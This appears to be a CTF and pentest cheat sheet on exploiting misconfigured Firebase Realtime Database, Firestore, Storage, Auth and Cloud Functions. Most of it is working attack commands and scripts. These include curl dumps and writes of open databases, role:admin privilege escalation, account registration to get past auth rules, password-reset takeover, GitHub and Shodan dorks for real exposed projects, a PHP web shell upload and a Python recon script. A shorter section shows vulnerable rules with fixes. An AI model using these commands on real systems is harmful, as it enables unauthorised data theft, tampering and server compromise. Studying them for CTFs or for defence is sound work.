# Firebase Misconfiguration

---

## Quick Reference

| Target | Test | Vulnerable Response |
|--------|------|-------------------|
| Realtime Database | `https://PROJECT.firebaseio.com/.json` | JSON data returned |
| Realtime Database | `https://PROJECT.firebaseio.com/.json?print=pretty` | Formatted JSON |
| Firestore | REST API GET on collection | Documents returned without auth |
| Storage Bucket | `https://storage.googleapis.com/PROJECT.appspot.com/` | XML file listing |
| Storage Bucket | `https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o` | JSON file listing |
| Auth | Register with API key | Account created → escalate |
| Functions | `https://us-central1-PROJECT.cloudfunctions.net/FUNCTION` | Response without auth |

```bash
# Fastest Firebase recon chain:
PROJECT="target-app"

# 1. Test RTDB open read
curl "https://$PROJECT.firebaseio.com/.json"

# 2. Test RTDB open write
curl -X PUT "https://$PROJECT.firebaseio.com/pwned.json" -d '"hacked"'

# 3. List Storage bucket
curl "https://storage.googleapis.com/$PROJECT.appspot.com/"

# 4. List Firestore collection
curl "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/users"
```

---

## What is Firebase? 🔓

Firebase is Google's Backend-as-a-Service (BaaS) platform. Developers use it to build apps without managing servers — it provides a database, authentication, file storage, hosting, and serverless functions all in one. The problem: **all Firebase configuration is embedded in the client-side JavaScript**, and security depends entirely on rules that are trivially misconfigured.

**Firebase services attackers target:**
- 🔴 **Realtime Database (RTDB)** — JSON NoSQL database, REST API accessible from anywhere
- 🔴 **Firestore** — Document database, REST API, rules-based access control
- 🔴 **Cloud Storage** — File storage (images, files, flags), GCS-backed buckets
- 🔴 **Authentication** — Email/password, OAuth — API key always exposed in client JS
- 🔴 **Cloud Functions** — Serverless endpoints, often deployed without auth checks
- ⚠️ The API key in Firebase is NOT a secret — it identifies the project, not authenticates the developer. Security comes from Firebase Security Rules — which are frequently misconfigured.

**Why Firebase is everywhere in CTFs:**
```
1. API key is always in the client JS → project ID always discoverable
2. Default RTDB rules allow public read/write until manually changed
3. Developers copy-paste rules without understanding them
4. "test mode" databases get deployed to production
5. Storage buckets default to private but rules can open them
```

---

## Finding Firebase Projects

### From Client-Side JavaScript

Every Firebase app embeds its config in the frontend JavaScript. Search the page source for:

```javascript
// Firebase config object — always in the JS:
const firebaseConfig = {
    apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXX",
    authDomain: "project-name.firebaseapp.com",
    databaseURL: "https://project-name.firebaseio.com",      // ← RTDB URL
    projectId: "project-name",
    storageBucket: "project-name.appspot.com",              // ← Storage bucket
    messagingSenderId: "123456789012",
    appId: "1:123456789012:web:abcdef123456"
};
```

**Search patterns:**
```bash
# In Burp or browser devtools — search JS files for:
firebaseio.com
firebaseapp.com
appspot.com
apiKey.*AIza
databaseURL
storageBucket
projectId
firebase.initializeApp

# Grep in downloaded JS:
grep -r "firebaseio\|appspot\|AIzaSy" ./js/
```

### From HTML / Meta Tags

```html
<!-- Sometimes in index.html directly -->
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
<script>
  const app = initializeApp({
    apiKey: "AIzaSy...",
    projectId: "ctf-challenge-2024"
  });
</script>
```

### From APK / Mobile App

```bash
# Decompile APK
apktool d target.apk -o output/

# Search for Firebase config
grep -r "firebaseio\|google-services\|AIzaSy" output/

# Check google-services.json
cat output/assets/google-services.json
```

### From google-services.json / GoogleService-Info.plist

```json
// google-services.json (Android) — often left in repos
{
  "project_info": {
    "project_id": "target-project",
    "firebase_url": "https://target-project.firebaseio.com",
    "storage_bucket": "target-project.appspot.com"
  },
  "client": [{
    "api_key": [{"current_key": "AIzaSyXXXXXXXX"}]
  }]
}
```

### From Public Sources

```bash
# GitHub search (find exposed configs)
"firebaseio.com" "apiKey" extension:js
"google-services.json" "firebase_url"
"AIzaSy" "databaseURL" extension:json

# Shodan
http.html:"firebaseio.com"

# VirusTotal (for APKs)
# Search by package name → download → extract config
```

---

## Realtime Database (RTDB) Attacks

### Testing Open Read Access

The RTDB has a REST API. Append `.json` to any node path:

```bash
# Root node — dumps entire database
curl "https://PROJECT-ID.firebaseio.com/.json"
curl "https://PROJECT-ID.firebaseio.com/.json?print=pretty"

# Specific nodes
curl "https://PROJECT-ID.firebaseio.com/users.json"
curl "https://PROJECT-ID.firebaseio.com/flags.json"
curl "https://PROJECT-ID.firebaseio.com/admin.json"
curl "https://PROJECT-ID.firebaseio.com/config.json"
curl "https://PROJECT-ID.firebaseio.com/secrets.json"

# Response if OPEN:
{
  "users": {
    "user1": { "email": "admin@target.com", "role": "admin", "token": "xxx" }
  },
  "flag": "CTF{firebase_is_open_lol}"
}

# Response if LOCKED:
null   ← node exists but no permission
# OR
{"error": "Permission denied"}
```

### Testing Open Write Access

```bash
# PUT — overwrite a node
curl -X PUT "https://PROJECT-ID.firebaseio.com/test.json" \
  -H "Content-Type: application/json" \
  -d '"hello"'

# POST — push a new child node (auto-generated key)
curl -X POST "https://PROJECT-ID.firebaseio.com/test.json" \
  -H "Content-Type: application/json" \
  -d '{"attacker": "was_here"}'

# PATCH — update specific fields
curl -X PATCH "https://PROJECT-ID.firebaseio.com/users/USER_ID.json" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# DELETE — remove a node
curl -X DELETE "https://PROJECT-ID.firebaseio.com/test.json"
```

### Privilege Escalation via Open Write

If read is locked but write is open — or you can write to your own user node:

```bash
# Step 1 — Read your current user structure
curl "https://PROJECT-ID.firebaseio.com/users/YOUR_UID.json"
# {"email": "you@test.com", "role": "user"}

# Step 2 — PATCH your role to admin
curl -X PATCH "https://PROJECT-ID.firebaseio.com/users/YOUR_UID.json" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "isAdmin": true}'

# Step 3 — Read admin-gated data
curl "https://PROJECT-ID.firebaseio.com/admin.json?auth=YOUR_ID_TOKEN"
```

### Enumerating Node Paths

When root is locked, try common node names:

```bash
# Common CTF node names to bruteforce:
nodes=(
  "flag" "flags" "Flag" "FLAG"
  "secret" "secrets" "admin" "config"
  "users" "user" "accounts" "credentials"
  "private" "hidden" "key" "keys"
  "token" "tokens" "password" "passwords"
  "data" "backup" "database" "notes"
  "challenge" "solution" "answer"
)

for node in "${nodes[@]}"; do
  result=$(curl -s "https://PROJECT-ID.firebaseio.com/$node.json")
  if [ "$result" != "null" ] && [ "$result" != '{"error":"Permission denied"}' ]; then
    echo "[FOUND] $node: $result"
  fi
done
```

### Shallow Query — Get All Top-Level Keys

Even when data is locked, you can sometimes list keys without reading values:

```bash
# shallow=true returns only keys, not values
curl "https://PROJECT-ID.firebaseio.com/.json?shallow=true"
# {"admin":true,"users":true,"config":true,"flag":true}
# ← reveals node names even if content is locked
```

### orderBy / limitToFirst Queries

```bash
# Query with ordering — may bypass some rule conditions
curl "https://PROJECT-ID.firebaseio.com/users.json?orderBy=\"role\"&equalTo=\"admin\""

# Limit results
curl "https://PROJECT-ID.firebaseio.com/posts.json?limitToFirst=10"

# Range query
curl "https://PROJECT-ID.firebaseio.com/scores.json?orderBy=\"score\"&startAt=100&endAt=999"
```

---

## Firestore Attacks

Firestore uses a different REST API than RTDB — document-oriented rather than tree-based.

### REST API Endpoints

```bash
BASE="https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# List a collection
curl "$BASE/users"
curl "$BASE/flags"
curl "$BASE/admin"
curl "$BASE/config"

# Get a specific document
curl "$BASE/users/admin"
curl "$BASE/flags/flag1"

# List all collections (requires admin — but try anyway)
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# With auth token
curl -H "Authorization: Bearer ID_TOKEN" "$BASE/private"

# Response format:
{
  "documents": [{
    "name": "projects/PROJECT-ID/databases/(default)/documents/flags/flag1",
    "fields": {
      "value": { "stringValue": "CTF{firestore_exposed}" }
    }
  }]
}
```

### Firestore with API Key

```bash
# API key can be used as parameter
curl "$BASE/users?key=AIzaSyXXXXXXXX"

# List collections with key
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users?key=API_KEY"
```

### Write to Firestore

```bash
# Create/overwrite a document
curl -X PATCH "$BASE/users/attacker?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "fields": {
      "role": {"stringValue": "admin"},
      "email": {"stringValue": "attacker@evil.com"}
    }
  }'
```

---

## Firebase Storage Attacks

### List Bucket Contents

```bash
BUCKET="PROJECT-ID.appspot.com"

# GCS XML API — lists all objects
curl "https://storage.googleapis.com/$BUCKET/"
curl "https://storage.googleapis.com/$BUCKET/?prefix=&delimiter=/"

# Firebase Storage API
curl "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o"
curl "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?prefix=/"

# Response if open:
<ListBucketResult>
  <Contents>
    <Key>flag.txt</Key>
    <Key>users/admin/profile.jpg</Key>
    <Key>backup/database.json</Key>
  </Contents>
</ListBucketResult>
```

### Download Files

```bash
# GCS direct download
curl "https://storage.googleapis.com/$BUCKET/flag.txt"
curl "https://storage.googleapis.com/$BUCKET/backup/database.json"

# Firebase Storage download URL
curl "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/flag.txt?alt=media"

# Encoded path (for files in subdirectories)
curl "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/backup%2Fdatabase.json?alt=media"

# Get file metadata
curl "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/flag.txt"
```

### Common Files to Check

```bash
# CTF targets in storage:
files=(
  "flag.txt" "flag" "Flag.txt" "FLAG.txt"
  "secret.txt" "secrets.txt" "key.txt"
  "backup.json" "database.json" "dump.json"
  "config.json" "config.php" ".env"
  "admin.json" "users.json" "credentials.json"
  "private.txt" "notes.txt" "README.txt"
)

for f in "${files[@]}"; do
  url="https://storage.googleapis.com/$BUCKET/$f"
  code=$(curl -s -o /tmp/resp -w "%{http_code}" "$url")
  if [ "$code" = "200" ]; then
    echo "[HIT] $f"
    cat /tmp/resp
  fi
done
```

### Upload to Open Storage

```bash
# If storage rules allow unauthenticated write:
curl -X POST \
  "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?uploadType=media&name=shell.php" \
  -H "Content-Type: application/octet-stream" \
  -d '<?php system($_GET["cmd"]); ?>'
```

---

## Firebase Authentication Abuse

### The API Key is Always Public

The Firebase API key (`AIzaSy...`) is **not a secret** — it's always embedded in the client JS. It identifies the project and is required for SDK calls. Security comes from Security Rules, not the key itself.

But the API key **enables these operations:**

```bash
API_KEY="AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXX"

# Register a new account (even if sign-up is "disabled" in console — try it)
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"password123","returnSecureToken":true}'

# Response:
{
  "idToken": "eyJhbGci...",     ← use this as Bearer token
  "email": "attacker@evil.com",
  "refreshToken": "...",
  "localId": "UID_HERE"          ← your Firebase UID
}
```

### Sign In and Get ID Token

```bash
# Sign in with existing credentials
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"password123","returnSecureToken":true}'

# Sign in anonymously (if enabled)
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```

### Use ID Token to Access Locked Data

```bash
ID_TOKEN="eyJhbGci..."

# RTDB with auth token
curl "https://PROJECT-ID.firebaseio.com/private.json?auth=$ID_TOKEN"

# Firestore with Bearer token
curl -H "Authorization: Bearer $ID_TOKEN" \
  "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/private"

# Storage with Bearer token
curl -H "Authorization: Bearer $ID_TOKEN" \
  "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/private%2Fflag.txt?alt=media"
```

### Enumerate User Accounts

```bash
# Get account info for current user
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d "{\"idToken\": \"$ID_TOKEN\"}"

# Response includes email, UID, provider info, custom claims
```

### Password Reset Abuse

```bash
# Trigger password reset for any known email
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"requestType":"PASSWORD_RESET","email":"admin@target.com"}'

# If you can intercept the reset link (e.g. from RTDB open read), take over the account
```

---

## Security Rules Analysis

Firebase Security Rules are JavaScript-like expressions that control access. Understanding them reveals exactly what's open and why.

### Default Rules — Completely Open (Test Mode)

```javascript
// RTDB — test mode default (NEVER deploy this to production)
{
  "rules": {
    ".read": true,   // ← anyone can read everything
    ".write": true   // ← anyone can write everything
  }
}

// Firestore — test mode default
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // ← completely open
    }
  }
}
```

### Locked Rules — Nothing Accessible

```javascript
// RTDB — fully locked
{
  "rules": {
    ".read": false,
    ".write": false
  }
}
```

### Common Misconfigured Rules — Where CTF Flags Hide

**Auth-only rule that anyone can bypass by registering:**

```javascript
// "Secure" but anyone can register a free account with the API key
{
  "rules": {
    ".read": "auth != null",   // ← requires auth, but auth is FREE
    ".write": "auth != null"   // just register with the API key
  }
}
// Attack: register → get ID token → read everything
```

**User can only read their own data — but write is open to all:**

```javascript
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",  // can only read own data
        ".write": "auth != null"        // ← any auth'd user can write to ANY uid!
      }
    }
  }
}
// Attack: register → write role:admin to victim's UID → victim now has admin role
```

**Admin flag checked from database — but attacker can write it:**

```javascript
{
  "rules": {
    "admin_data": {
      ".read": "root.child('users').child(auth.uid).child('isAdmin').val() === true"
      // ← reads isAdmin from database... which has open write!
    },
    "users": {
      "$uid": {
        ".write": "$uid === auth.uid"  // can write own user node
      }
    }
  }
}
// Attack: register → write isAdmin:true to own UID → read admin_data
```

**Wildcard path allows access to parent:**

```javascript
// Firestore — intended to protect /admin, but wildcard exposes it
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{userId} {
      allow read: if request.auth.uid == userId;
    }
    // MISSING: explicit deny for /admin
    // Wildcard below catches everything including /admin
    match /{document=**} {
      allow read: if request.auth != null;  // ← /admin is readable by any auth'd user
    }
  }
}
```

---

## Cloud Functions Attacks

Firebase Cloud Functions are serverless Node.js functions — often deployed without proper auth checks.

### Discovering Function Endpoints

```bash
# Default URL pattern:
https://us-central1-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME

# Also try regions:
https://europe-west1-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME
https://asia-east1-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME

# Find function names from:
# - JS source code (fetch calls, axios calls)
# - Network tab in DevTools
# - firebase.json in public repos
# - Error messages that leak function names
```

### Testing Functions Without Auth

```bash
FUNC_URL="https://us-central1-PROJECT-ID.cloudfunctions.net/getFlag"

# GET request
curl "$FUNC_URL"

# POST with JSON
curl -X POST "$FUNC_URL" \
  -H "Content-Type: application/json" \
  -d '{"action": "getFlag"}'

# With auth token (if required)
curl -H "Authorization: Bearer $ID_TOKEN" "$FUNC_URL"

# Try admin actions
curl -X POST "$FUNC_URL" \
  -H "Content-Type: application/json" \
  -d '{"action": "listUsers"}'

curl -X POST "$FUNC_URL" \
  -H "Content-Type: application/json" \
  -d '{"uid": "admin", "action": "getPrivateData"}'
```

### Common Function Vulnerabilities

```javascript
// ❌ Vulnerable — no auth check at all
exports.getFlag = functions.https.onRequest((req, res) => {
    res.json({ flag: process.env.FLAG });  // ← anyone can call this
});

// ❌ Vulnerable — checks auth but trusts client-supplied UID
exports.getAdminData = functions.https.onRequest(async (req, res) => {
    const uid = req.body.uid;   // ← attacker controls this
    const user = await admin.auth().getUser(uid);
    if (user.customClaims?.admin) {
        res.json(secretData);
    }
});
// Attack: supply admin user's UID directly

// ❌ Vulnerable — IDOR via function parameter
exports.getUserData = functions.https.onRequest(async (req, res) => {
    const userId = req.query.id;  // no ownership check
    const data = await db.ref(`users/${userId}`).once('value');
    res.json(data.val());
});
```

---

## Automation Tools

### FireBase Exploit Tools

```bash
# firebaseEnum — enumerate Firebase projects
pip install firebaseEnum
firebaseEnum -k API_KEY

# Firebase Security Rules scanner
# Manual check — fetch rules (if accessible):
curl "https://PROJECT-ID.firebaseio.com/.settings/rules.json?auth=ADMIN_TOKEN"

# GCPBucketBrute — enumerate GCS buckets
python3 gcpbucketbrute.py -k keyword -u

# gsutil — Google Cloud Storage CLI
gsutil ls gs://PROJECT-ID.appspot.com/
gsutil cp gs://PROJECT-ID.appspot.com/flag.txt .
gsutil ls -r gs://PROJECT-ID.appspot.com/    # recursive list
```

### Python Firebase Recon Script

```python
import requests
import json

PROJECT = "target-project-id"
API_KEY = "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXX"

def test_rtdb():
    print("\n[*] Testing Realtime Database...")
    
    # Test root read
    r = requests.get(f"https://{PROJECT}.firebaseio.com/.json")
    if r.status_code == 200 and r.text != "null":
        print(f"[OPEN READ] Root: {r.text[:200]}")
    
    # Test shallow keys
    r = requests.get(f"https://{PROJECT}.firebaseio.com/.json?shallow=true")
    if r.status_code == 200 and r.text != "null":
        print(f"[KEYS] {r.text}")
    
    # Test write
    r = requests.put(
        f"https://{PROJECT}.firebaseio.com/recon_test.json",
        json="test"
    )
    if r.status_code == 200:
        print("[OPEN WRITE] Database is writable!")
        # Clean up
        requests.delete(f"https://{PROJECT}.firebaseio.com/recon_test.json")

def test_storage():
    print("\n[*] Testing Storage Bucket...")
    bucket = f"{PROJECT}.appspot.com"
    
    r = requests.get(f"https://storage.googleapis.com/{bucket}/")
    if r.status_code == 200:
        print(f"[OPEN] Bucket listing enabled!")
        print(r.text[:500])
    
    # Try Firebase Storage API
    r = requests.get(
        f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o"
    )
    if r.status_code == 200:
        data = r.json()
        if 'items' in data:
            for item in data['items']:
                print(f"[FILE] {item['name']}")

def register_user():
    print("\n[*] Attempting user registration...")
    r = requests.post(
        f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
        json={"email": "recon@test.com", "password": "recon1234", "returnSecureToken": True}
    )
    if r.status_code == 200:
        data = r.json()
        print(f"[REGISTERED] UID: {data['localId']}")
        print(f"[TOKEN] {data['idToken'][:50]}...")
        return data['idToken'], data['localId']
    else:
        print(f"[-] Registration failed: {r.json().get('error', {}).get('message')}")
    return None, None

def test_rtdb_with_auth(token):
    print("\n[*] Testing RTDB with auth token...")
    nodes = ["flag", "flags", "admin", "users", "config", "private", "secret"]
    for node in nodes:
        r = requests.get(
            f"https://{PROJECT}.firebaseio.com/{node}.json",
            params={"auth": token}
        )
        if r.status_code == 200 and r.text not in ["null", '{"error":"Permission denied"']:
            print(f"[HIT] /{node}: {r.text[:200]}")

if __name__ == "__main__":
    test_rtdb()
    test_storage()
    token, uid = register_user()
    if token:
        test_rtdb_with_auth(token)
```

---

## Exploitation Workflow

1. **Find the Firebase config** — search JS source for `firebaseConfig`, `apiKey`, `databaseURL`, `storageBucket`
2. **Extract project ID** — from `databaseURL` (`PROJECT.firebaseio.com`) or `projectId` field
3. **Test RTDB root** — `curl https://PROJECT.firebaseio.com/.json` — open read = dump everything
4. **Test RTDB shallow** — `?shallow=true` — reveals node names even when data is locked
5. **Test RTDB write** — `PUT` a test value — open write = privilege escalation or flag plant
6. **List Storage bucket** — `https://storage.googleapis.com/PROJECT.appspot.com/` — look for flag files
7. **Register a user** — use API key to create an account → get ID token
8. **Test with ID token** — retry locked nodes with `?auth=TOKEN` — `auth != null` rules now pass
9. **Analyze security rules** — check if admin flag is stored in database (writable) → escalate
10. **Test Cloud Functions** — enumerate function URLs from JS source → call without auth → check for flag

---

## Common Vulnerable Patterns

**RTDB test mode left in production:**

```javascript
// ❌ Deployed with test mode rules
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
// Fix: use auth-based rules minimum
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

**Firestore rules with missing collection protection:**

```javascript
// ❌ Wildcard catches admin collection
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{uid} {
      allow read, write: if request.auth.uid == uid;
    }
    match /{document=**} {
      allow read: if request.auth != null;  // ← /admin readable by any user!
    }
  }
}

// ✅ Fixed — explicit deny before wildcard
    match /admin/{document=**} {
      allow read, write: if false;  // ← explicit lock
    }
    match /{document=**} {
      allow read: if request.auth != null;
    }
```

**Admin privilege stored in database (user-writable):**

```javascript
// ❌ Rule reads isAdmin from DB, but user can write their own node
{
  "rules": {
    "admin": {
      ".read": "root.child('users').child(auth.uid).child('isAdmin').val() == true"
    },
    "users": {
      "$uid": {
        ".write": "auth.uid == $uid"  // ← user can write isAdmin to their own node
      }
    }
  }
}
// ✅ Fixed — use custom claims instead (set server-side only)
// Admin check: auth.token.admin == true  (custom claim, not DB value)
```

---

## CTF & Practical Tips

**Fastest CTF Firebase chain:**

```bash
# 1. Get project ID from page source
grep -o '"projectId":"[^"]*"' page.html

# 2. Try root read
curl "https://PROJECT.firebaseio.com/.json?print=pretty"

# 3. Get shallow keys if root locked
curl "https://PROJECT.firebaseio.com/.json?shallow=true"

# 4. List storage
curl "https://storage.googleapis.com/PROJECT.appspot.com/"

# 5. Register user and retry with token
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -d '{"email":"a@b.com","password":"pass1234","returnSecureToken":true}'
# Take idToken from response, use as ?auth=TOKEN
```

**Speed tips:**
- ✅ Always try `?shallow=true` before giving up on a locked RTDB — reveals node names for targeted guessing
- ✅ Register a throwaway account with the API key — `auth != null` rules are the most common "secure" misconfiguration and they're trivially bypassed
- ✅ Check Storage even if RTDB is locked — rules are independent, bucket may be wide open
- ✅ `gsutil ls gs://PROJECT.appspot.com/` is faster than the REST API for listing files
- ✅ Look for `process.env.FLAG` or hardcoded flags in Cloud Functions — check JS source for function URLs
- ⚠️ RTDB and Firestore are separate services with separate rules — being blocked from one doesn't mean both are locked
- ⚠️ Firebase Hosting often serves the compiled JS — check the static files at `https://PROJECT.web.app` for config leaks
- ⚠️ Old Firebase URLs used `https://PROJECT.firebaseio.com` — newer projects may use custom domains, check the `databaseURL` field specifically

**Common CTF scenarios:**
- **"Web app with Firebase"** → extract config from JS → test RTDB root → flag in `/flags` node
- **"Auth required"** → register with API key → get token → retry with `?auth=TOKEN`
- **"RTDB locked but writable"** → write `isAdmin: true` to own user node → read admin data
- **"Storage bucket exposed"** → list files → download `flag.txt` or `backup.json`
- **"Cloud Function endpoint"** → call without auth → flag in response or environment variable
- **"Custom security rules"** → analyze the rule logic → find path that evaluates to `true` with registered user

---

## Key Takeaways

- ✅ The Firebase API key is always public — it's an identifier, not a secret. Security lives entirely in the Security Rules
- ✅ Test RTDB with `.json?print=pretty` and `.json?shallow=true` — shallow reveals structure even when data is locked
- ✅ Register a user with the API key — `auth != null` is the most common "secure" rule and costs you nothing to bypass
- ✅ RTDB and Firestore and Storage all have independent rules — check all three even if one is locked
- ✅ Admin privilege stored in the database is writable by the user who owns that node — always escalate via self-write before trying harder attacks
- ✅ Cloud Functions are serverless but not auth-protected by default — enumerate URLs from JS and call them directly